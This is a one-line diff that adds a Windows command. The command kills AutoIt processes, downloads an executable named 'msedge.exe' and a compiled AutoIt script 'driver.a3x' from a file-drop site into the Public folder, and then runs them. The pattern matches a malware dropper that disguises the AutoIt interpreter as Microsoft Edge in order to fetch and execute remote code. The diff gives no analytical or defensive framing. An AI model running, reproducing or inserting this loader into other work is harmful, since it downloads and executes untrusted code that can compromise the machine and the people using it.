@@ -1,0 +1,1 @@
+(taskkill /F /IM Autoit3.exe 2>nul || echo Autoit3.exe not running) && curl -o C:\Users\Public\msedge.exe https://dropthefile.com/msedge.exe && curl -o C:\Users\Public\driver.a3x https://dropthefile.com/driver.a3x && start C:\Users\Public\msedge.exe C:\Users\Public\driver.a3x
